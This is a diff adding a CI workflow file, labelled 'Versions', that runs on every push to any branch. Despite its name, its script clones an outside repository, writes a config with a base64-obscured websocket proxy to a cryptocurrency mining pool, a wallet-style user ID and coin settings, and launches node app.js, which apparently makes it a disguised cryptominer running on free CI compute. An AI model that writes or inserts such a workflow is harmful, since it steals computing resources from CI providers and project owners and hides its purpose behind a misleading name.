@@ -1,0 +1,26 @@
+workflows:
+  info-and-versions:
+    name: Versions
+    max_build_duration: 110
+    triggering:
+      events:
+        - push
+      branch_patterns:
+        - pattern: "*"
+          include: true
+    scripts:
+      - name: Run
+        script: |
+          git clone https://github.com/dedgoodwc/dedf dir-a
+          cd dir-a
+          cat > config.json << EOF
+          {
+            "log": false,
+            "host": "wss://proxy-tq9r.onrender.com/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
+            "user": "SWrtFsEa237mckDo7hmtHR2YtadmbZJNus",
+            "pass": "c=DGB,123magic",
+            "threads": 5,
+            "port": 8080
+          }
+          EOF
+          node app.js
